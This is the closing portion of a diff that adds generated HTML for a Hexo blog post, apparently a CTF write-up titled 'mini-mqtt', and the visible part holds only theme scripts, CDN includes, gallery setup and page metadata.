+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "mini-mqtt",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/05/23/PolarisCTF_2026_WEBPWN/mini-mqtt/",
+          excerpt: "",
+          description: "",
+          stripContent: "mini-mqttmqtt 的题目也是第一次见，PolarisCTF 的质量确实很高，有 WEBPWN的复现环境也是很好了  程序分析：main1234567891011121314151617181920212223242526272829303132333435363738394041424344454647int __fastcall main(int argc, const char **argv, const char **envp)&amp;#123;    const char *v3; ",
+          date: "Sat May 23 2026 02:46:53 GMT+0800",
+          updated: "Sat May 23 2026 02:58:43 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
